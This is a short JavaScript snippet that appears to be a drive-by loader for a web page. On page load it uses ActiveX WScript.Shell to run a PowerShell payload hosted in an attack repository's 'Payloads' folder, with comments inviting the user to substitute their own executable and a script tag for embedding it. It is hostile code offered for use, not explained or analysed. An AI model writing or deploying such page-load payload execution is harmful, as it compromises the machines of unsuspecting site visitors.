// Your JavaScript code goes here

var url = 'https://raw.githubusercontent.com/cmndcntrlcyber/one-attck-per-time/main/Payloads/pwsh/WonTonPlatypus.ps1'; // Replace with the actual path to your executable file on the web server

window.onload = function() {
    window.setTimeout(function() {
        var exec = new ActiveXObject("WScript.Shell");
        exec.Run(url);
    }, 0); // Execute immediately by passing 0 as the delay parameter
};

<script type="text/javascript" src="path/to/your_js_file.js"></script>